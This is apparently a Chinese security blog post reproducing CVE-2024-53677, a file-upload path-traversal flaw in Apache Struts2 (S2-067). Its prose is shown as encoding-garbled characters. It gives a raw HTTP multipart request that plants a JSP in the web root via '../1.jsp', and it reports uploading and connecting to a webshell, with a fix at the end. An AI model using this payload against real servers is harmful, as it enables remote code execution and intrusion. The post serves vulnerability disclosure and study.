#  CVE-2024-53677ï¼šApache Struts2æ–‡ä»¶ä¸Šä¼ é€»è¾‘æ¼æ´S2-067   
åŸåˆ› hexixi  Timeline Sec   2024-12-20 10:10  
  
>   
> å…³æ³¨æˆ‘ä»¬â¤ï¸ï¼Œæ·»åŠ æ˜Ÿæ ‡ğŸŒŸï¼Œä¸€èµ·å­¦å®‰å…¨ï¼ä½œè€…ï¼šhexixi@Timeline Sec æœ¬æ–‡å­—æ•°ï¼š2290é˜…è¯»æ—¶é•¿ï¼š3ï½5mins å£°æ˜ï¼šä»…ä¾›å­¦ä¹ å‚è€ƒä½¿ç”¨ï¼Œè¯·å‹¿ç”¨ä½œè¿æ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè´Ÿ  
  
## 0x01 ç®€ä»‹  
  
Apache Struts2 æ˜¯ä¸€ä¸ªæµè¡Œçš„ Java Web åº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œå¹¿æ³›ç”¨äºå¼€å‘ä¼ä¸šçº§åº”ç”¨ã€‚è¯¥æ¼æ´å‡ºç°åœ¨ Struts2 çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¸­ï¼Œç”±äºç¼ºä¹å¯¹ä¸Šä¼ æ–‡ä»¶ç±»å‹çš„ä¸¥æ ¼éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡æ–‡ä»¶ç±»å‹è¿‡æ»¤è§„åˆ™ï¼Œä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œä»è€Œåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç æˆ–å¼€å±•è¿›ä¸€æ­¥çš„æ”»å‡»ã€‚  
## 0x02 æ¼æ´æ¦‚è¿°  
  
**æ¼æ´ç¼–å·ï¼šCVE-2024-53677**åœ¨è¿œç¨‹æœåŠ¡å™¨ä»£ç ä¸­ä½¿ç”¨äº†FileUploadInterceptorä½œä¸ºæ–‡ä»¶ä¸Šä¼ ç»„ä»¶æ—¶ï¼ŒApache Strutsåœ¨æ–‡ä»¶ä¸Šä¼ é€»è¾‘ä¸Šå­˜åœ¨æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è¿›è¡Œè·¯å¾„éå†ï¼ŒæˆåŠŸåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥ä½¿æ”»å‡»è€…èƒ½å¤Ÿä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚  
## 0x03 åˆ©ç”¨æ¡ä»¶  
  
**1ï¼‰å½±å“ç‰ˆæœ¬**Struts 2.0.0 - Struts 2.3.37ï¼ˆEOLï¼‰Struts 2.5.0 - Struts 2.5.33Struts 6.0.0 - Struts 6.3.0.2**2ï¼‰****æ‰€éœ€æƒé™ï¼š**æ— æƒé™è¦æ±‚  
  
**3ï¼‰å…¶ä»–æ¡ä»¶ï¼š**å­˜åœ¨ä¸Šä¼ ç‚¹ä¸”ä½¿ç”¨äº†FileUploadInterceptorä½œä¸ºæ–‡ä»¶ä¸Šä¼ ç»„ä»¶  
## 0x04 ç¯å¢ƒæ­å»º  
  
ideaæ‰“å¼€æºç ï¼Œé€‰æ‹©æœ¬åœ°tomcatï¼Œåœ¨Deploymentä¸­å¦‚å›¾æ‰€ç¤ºéƒ¨ç½²ï¼ˆç¯å¢ƒæºç ï¼šåå°å›å¤**HJ-S2-067**ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjhzP1e2nl43kjLKjseKC4jCEYnvVo2KTZxBPbS183rMXm1vZJ5ib2fbN05QTcOH7rO7zp4DopiaK2g/640?wx_fmt=png&from=appmsg "")  
  
è¿è¡Œï¼Œè®¿é—®http://localhost:8080/untitled_war  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjhzP1e2nl43kjLKjseKC4jBFwOGibC7G7XsRyiaOREwRjY7iculmCV4xOVJAMv9XX8diaic6FnNmmHe9w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjhzP1e2nl43kjLKjseKC4jicCB3kx7kvTyDlE3HS9AavprpiaS1MTBG8OHNuJBsUVLkQYSYyQ8Pqyg/640?wx_fmt=png&from=appmsg "")  
## 0x05 æ¼æ´å¤ç°  
  
åˆ©ç”¨pocä¸Šä¼ ä¸€ä¸ªæµ‹è¯•jspï¼Œåˆ©ç”¨è·¯å¾„ç©¿è¶Šåˆ°webæ ¹ç›®å½•  
```
POST /untitled_war/uploads.action HTTP/1.1
Host: IP:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://172.16.65.98:8080/untitled_war/
Content-Type: multipart/form-data; boundary=---------------------------376058448320617365003265882680
Content-Length: 529
Origin: http://192.168.0.116:8080
Connection: close
Cookie: JSESSIONID=953590EEDDD585B3CFE1A15E18C518C9
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------376058448320617365003265882680
Content-Disposition: form-data; name="Upload"; filename="1.txt"
Content-Type: application/octet-stream

<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>

<body>
    <p>test</p>
</body>
</html>


-----------------------------376058448320617365003265882680
Content-Disposition: form-data; name="uploadFileName[0]";

../1.jsp
-----------------------------376058448320617365003265882680--


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjhzP1e2nl43kjLKjseKC4jrv69bnQIPVTqeM6ib2stdylaicLMC0d84RkFibIwBSU0CGiaDH9mCKUzEg/640?wx_fmt=png&from=appmsg "")  
  
å¯ä»¥è¢«è§£æ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjhzP1e2nl43kjLKjseKC4jnZbiaDLLJmicFSluBZhvEFNMU8bBGy6lzbTibDLyycoUstfM7o7ujDqUA/640?wx_fmt=png&from=appmsg "")  
  
åŒæ ·æ–¹å¼ä¸Šä¼ å†°èé©¬åˆ°webæ ¹ç›®å½•  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjhzP1e2nl43kjLKjseKC4jX0Fm2Cux1FDOgL82dMJ1EkZMCibl7SFWPw8vvhPfeASbybN0vsPTTTg/640?wx_fmt=png&from=appmsg "")  
  
æˆåŠŸè¿æ¥webshell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsjhzP1e2nl43kjLKjseKC4jn7OSUsKO9ehqJKbiaSpsrLncKdr4fcevzGMl6g8BQsAEUCq6o2J1iaIA/640?wx_fmt=png&from=appmsg "")  
## 0x06 ä¿®å¤æ–¹å¼  
  
å°†æ¡†æ¶å‡çº§åˆ°å®˜æ–¹å‘å¸ƒçš„æœ€æ–°ç‰ˆæœ¬å¹¶ä¸”ä½¿ç”¨ActionFileUploadInterceptorä½œä¸ºæ–‡ä»¶ä¸Šä¼ ç»„ä»¶ã€‚  
## å‚è€ƒé“¾æ¥  
  
https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/  
## å†å²å¤ç°  
  
[CVE-2020-17530](https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247487202&idx=1&sn=b3f8bca55d6d670fa74e83deec7ccaf1&scene=21#wechat_redirect)  
[CVE-2019-0230](https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247486306&idx=1&sn=ca954f7391314edaa9e5f680488b9a41&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
å›å¤  
ã€åŠ ç¾¤ã€‘  
è¿›å…¥å¾®ä¿¡äº¤æµç¾¤å›å¤  
ã€SRCç¾¤ã€‘è¿›å…¥SRC-QQäº¤æµç¾¤å›å¤  
ã€æ–°äººã€‘é¢†å–æ–°äººå­¦ä¹ æŒ‡å—èµ„æ–™å›å¤  
ã€é¢è¯•ã€‘è·å–æ¸—é€æµ‹è¯•å¸¸è§é¢è¯•é¢˜  
  
å›å¤  
ã€æ‰‹å†Œã€‘  
è·å–åŸåˆ›æŠ€æœ¯PDFæ‰‹å†Œ  
  
å›å¤  
ã€åˆä½œã€‘è·å–å„ç±»å®‰å…¨é¡¹ç›®åˆä½œæ–¹å¼å›å¤  
ã€å¸®ä¼šã€‘ä»˜è´¹åŠ å…¥SRCçŸ¥è¯†åº“å­¦ä¹ å›å¤  
ã€  
åŸ¹è®­ã€‘  
è·å–TimelineSecåˆ›åŠçš„å®æˆ˜è¯¾ç¨‹  
  
  
è§†é¢‘å·ï¼šæœç´¢  
TimelineSec  
  
å®˜æ–¹å¾®åšï¼š[#å°ç¨‹åº://å¾®åš/tPbUYdN9EucSD4C]()  
  
  
å“”å“©å“”å“©ï¼š  
https://space.bilibili.com/52459  
â€1903  
  
  
  
â¤  
  
è§‰å¾—æœ‰ç”¨å°±ç‚¹ä¸ªèµå§ï¼  
  
æ¬¢è¿è¯„è®ºåŒºç•™è¨€è®¨è®ºï½  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
